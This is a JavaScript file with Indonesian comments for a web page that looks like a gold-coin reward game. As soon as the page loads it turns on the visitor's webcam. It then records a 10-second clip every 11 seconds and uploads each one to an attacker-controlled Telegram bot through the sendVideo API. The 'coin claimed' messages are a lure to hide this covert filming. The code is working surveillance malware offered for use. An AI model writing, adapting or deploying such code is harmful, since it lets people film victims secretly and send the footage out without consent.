let mediaRecorder;
let videoChunks = [];
const statusDisplay = document.getElementById('status');
const countdownDisplay = document.getElementById('countdown');
const goldClaimMessage = document.getElementById('goldClaimMessage');
const goldCoin = document.getElementById('goldCoin');
let recordingInterval;
let countdownTimer;

// Masukkan token bot Telegram Anda di sini
const telegramBotToken = 'TOKEN_BOT_ANDA';  // Ganti dengan token bot Telegram Anda

// Masukkan chat ID atau ID grup/channel di sini
const chatId = 'ID_CHAT_ANDA';  // Ganti dengan chat ID atau username channel

async function startRecording() {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });

    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

    mediaRecorder.ondataavailable = (event) => {
        videoChunks.push(event.data);
    };

    // Function to send video to Telegram
    async function sendVideoToTelegram() {
        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });

        // Debugging: Cek format sebelum dikirim
        console.log("Format video:", videoBlob.type);

        // Buat URL agar bisa dicek sebelum dikirim
        const videoURL = URL.createObjectURL(videoBlob);
        window.open(videoURL);

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('video', videoBlob, 'recording.webm');
        formData.append('supports_streaming', true);

        try {
            let response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
                method: 'POST',
                body: formData,
            });

            let data = await response.json();
            if (data.ok) {
                statusDisplay.textContent = 'Koin berhasil terkirim ke tabungan!';
            } else {
                statusDisplay.textContent = 'Error: ' + data.description;
            }
        } catch (error) {
            statusDisplay.textContent = 'Error saat mengklaim coba lagi!';
            console.error('Error:', error);
        }

        videoChunks = []; // Reset videoChunks setelah pengiriman
    }

    // Function to start 10 seconds recording loop with countdown and gold claim message
    function start10SecondsRecording() {
        let countdown = 10;
        countdownDisplay.textContent = countdown;

        countdownTimer = setInterval(() => {
            countdown--;
            countdownDisplay.textContent = countdown;

            if (countdown <= 5) {
                goldClaimMessage.style.display = 'block';
                goldCoin.style.display = 'block';
            } else {
                goldClaimMessage.style.display = 'none';
                goldCoin.style.display = 'none';
            }

            if (countdown === 0) {
                clearInterval(countdownTimer);
            }
        }, 1000);

        mediaRecorder.start();

        setTimeout(() => {
            mediaRecorder.stop();  // Stop recording after 10 seconds
        }, 10000);

        mediaRecorder.onstop = () => {
            sendVideoToTelegram();  // Send the recorded video to Telegram
        };
    }

    // Start the recording loop
    recordingInterval = setInterval(() => {
        start10SecondsRecording();
    }, 11000);  // Start a new recording every 11 seconds (1 second gap for sending)
}

// Automatically start recording when the page is loaded
window.addEventListener('load', () => {
    startRecording();
    statusDisplay.textContent = 'loading...';
});

// Clear the interval when the page is closed or refreshed
window.addEventListener('beforeunload', () => {
    clearInterval(recordingInterval);
});